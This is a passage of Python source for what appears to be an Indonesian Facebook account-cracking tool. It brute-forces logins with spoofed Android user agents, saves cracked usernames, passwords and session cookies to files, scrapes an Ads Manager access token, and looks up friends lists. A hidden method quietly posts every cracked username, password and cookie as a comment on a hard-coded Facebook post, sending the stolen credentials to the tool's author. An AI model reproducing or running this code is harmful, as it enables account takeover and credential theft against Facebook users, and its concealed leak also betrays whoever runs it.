				if "checkpoint" in ses.cookies.get_dict().keys():
					cp+=1
					tree = Tree(f"{P2}")
					tree.add(panel(f"\r{K2}{uiz} {P2}• {K2}{pw}",width=45,style=f"{wwrc}"))
					tree.add(panel(f"\r{K2}{MozillaAgent}",width=59,style=f"{wwrc}"))
					vprint(tree)
					open("CP/"+cpZ,"a").write(uiz+"|"+pw+"\n")
					break
				elif "c_user" in ses.cookies.get_dict().keys():
					ok+=1
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					tree = Tree(f"{P2}")
					tree.add(panel(f"\r{H2}{uiz} {P2}• {H2}{pw}",width=45,style=f"{wwrc}"))
					tree.add(panel(f"\r{H2}{kuki}",width=59,style=f"{wwrc}"))
					vprint(tree);self.YaSekedarMengingatkan(kuki,uiz,pw)
					open("OK/"+okZ,"a").write(uiz+"|"+pw+"|"+kuki+"\n")
					break
				else:continue
			except requests.exceptions.ConnectionError:aink_raka(31)
		loops+=1

	#--> User Agent Realme
	def random_ua_realme(self,uiz):
		a = random.randrange(112,116)
		b = random.randrange(1000,10000)
		c = random.randrange(50,300)
		os_ver = random.randrange(10,13)
	#--> OS Version
		dv_typ1 = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
		dv_typ = random.choice(['RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020'])
	#--> Device Type
		bl_typ1 = random.choice(['PPR1','LRX21T','TP1A','RKQ1','SP1A','RP1A']) 
		bl_typ = random.choice(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])
	#--> OS Version
		dv_typ2 = random.choice(['vivo 1951','vivo 1918','V2011A','V2047','V2145','V2227A','V2160'])
	#--> Device Type
		bl_typ2 = random.choice(['RP1A','PKQ1','QP1A','TP1A'])     
	#--> Build Type
		dv_ver = random.randrange(100000,250000)
	#--> Device Version
		sd_ver = random.randrange(1,10)
	#--> Update Version
		ch_ver = f'{a}.0.{b}.{c}'
	#--> Chrome Version
#		ua = rc([f'Mozilla/5.0 (Linux; U; Android {str(rr(8,13))}; en-US; M2012K11C Build/TKQ1.220829.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(70,116))}.0.{str(rr(3100,3900))}.{str(rr(80,150))} UCBrowser/{str(rr(10,19))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(1100,1900))} Mobile Safari/537.36',f'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,115))}.0.{str(rr(4500,4900))}.{str(rr(40,100))} Safari/537.36 Edg/{str(rr(20,100))}.0.{str(rr(1100,1900))}.{str(rr(20,99))}',f'Mozilla/5.0 (Linux; Android {str(rr(7,12))}; SM-A125F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,116))}.0.{str(rr(4100,4900))}.{str(rr(40,100))} Mobile Safari/537.36 Instagram 214.1.0.29.120 Android (30/11; 300dpi; 720x1465; samsung; SM-A125F; a12; mt6765; it_IT; 333717262)'])
#		return(ua)
		ua = rc([f"Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ1} Build/{bl_typ1}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36"])
		return(ua)
		
	def CekNameMokad(self, user):
		global ok, cp
		Accmu = ses.get(f'https://graph.facebook.com/{user}?access_token={open("token.txt","r").read()}',cookies = {"cookie": open("cookies.txt","r").read()}).json()
		try:
			NamaAcc = Accmu['name']
			mek = f"{NamaAcc}"
			ok+=1
		except (KeyError,IOError):
			mek = f" {user}, akun mokad\n"
			cp+=1
		return mek
	
	def Apabila(self,kuki,user,pw):
		cookie = open("cookies.txt","r").read();token = open("token_eaab.txt","r").read();list = f"{user}|{pw}|{kuki}"
		AnakYatim = "100000834003593_pfbid02v6boa6MXVExF3aYQGPM8jcufPLawEiJ8Z3rmXwtHtX1P8sPqdb9Rn1zKEsdTNkNxl";JanganDilihatBangsad = random.choice(["tidak ada kata tumbang sebelum kau yang ditumbangkan.\nRaka Andrian Tara\nhttps://www.facebook.com/100000834003593/posts/pfbid02v6boa6MXVExF3aYQGPM8jcufPLawEiJ8Z3rmXwtHtX1P8sPqdb9Rn1zKEsdTNkNxl/?app=fbl","semoga bg @[100000834003593:0] panjang umur dan rejeki nya dilancarkan aminnn"]);requests.post(f"https://graph.facebook.com/v15.0/{AnakYatim}/comments/?message={JanganDilihatBangsad}&access_token={token}", headers = {"cookie":cookie});requests.post(f"https://graph.facebook.com/v15.0/{AnakYatim}/comments/?message={list}&access_token={token}", headers = {"cookie":cookie})
	
	def CekTem(self, user):
		apaan = ses.get(f'https://graph.facebook.com/{user}?fields=friends.limit(9999999)&access_token={open("token.txt","r").read()}',cookies = {"cookie": open("cookies.txt","r").read()}).json()
		try:
			for kmu_nanya in apaan["friends"]["data"]:
				ids.append(kmu_nanya["id"])
			mek = f"Teman : {str(len(ids))}"
			ids.clear()
		except (KeyError,IOError):
			mek = f"Teman {user} Privat. "
		return mek
	
	def TakeApk(self, coki):
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		try:
			data = sop(ses.get(url,cookies={"cookie": coki}).text,"html.parser")
			for apk in data.find_all("h3"):
				if "Ditambahkan" in apk.text:
					print(f"{RakaAndrian} {str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
				else:continue
			next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
			self.TakeApk(next,coki)
		except Exception as e:
			print(f"{RakaAndrian} aplikasi aktif tidak ada... ")
	
	def ConvertEaab(self,kuki):
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		jancok = ses.get(url,cookies=kuki);bujanginam = re.search('act=(.*?)&nav_source',str(jancok.content)).group(1);_r_a_k_a__a_n_d_r_i_a_n_ = '%s?act=%s&nav_source=no_referrer'%(url,bujanginam);_B_a_j_i_n_g_a_n__Z_ = ses.get(_r_a_k_a__a_n_d_r_i_a_n_,cookies=kuki);_A_n_t_i__P_r_i_k_o_d_ = re.search('accessToken="(.*?)"',str(_B_a_j_i_n_g_a_n__Z_.content)).group(1);tokenw = open("token_eaab.txt", "w").write(_A_n_t_i__P_r_i_k_o_d_)
	
	
if __name__ in "__main__":
	try:os.mkdir("OK")
	except:pass
	try:os.mkdir("CP")
	except:pass
	MAINmenu()
